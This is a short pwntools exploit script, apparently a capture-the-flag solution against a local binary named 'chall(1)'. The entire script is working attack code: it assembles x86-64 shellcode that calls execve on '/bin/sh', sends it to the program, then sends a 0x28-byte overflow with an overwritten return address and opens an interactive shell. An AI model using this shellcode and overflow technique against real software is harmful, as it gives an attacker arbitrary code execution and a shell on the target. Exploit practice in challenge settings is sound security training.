from pwn import *

context.arch = "amd64"
context.terminal = ['kitty', '-e', 'sh', '-c']

shellcode = asm("""
    mov rbx,0x68732f6e69622f
    push 0x00
    push rbx
    
    mov rax,59
    lea rdi,[rsp]
    mov rsi,0
    mov rdx,0
    syscall
    """)

io = process('./challs/chall(1)')

print(io.recv().decode())
io.sendline(shellcode)
print(io.recv().decode())
#gdb.attach(io)
io.sendline('A' * 0x28 + '\x70\x40\x40\x00\x00')
io.interactive()
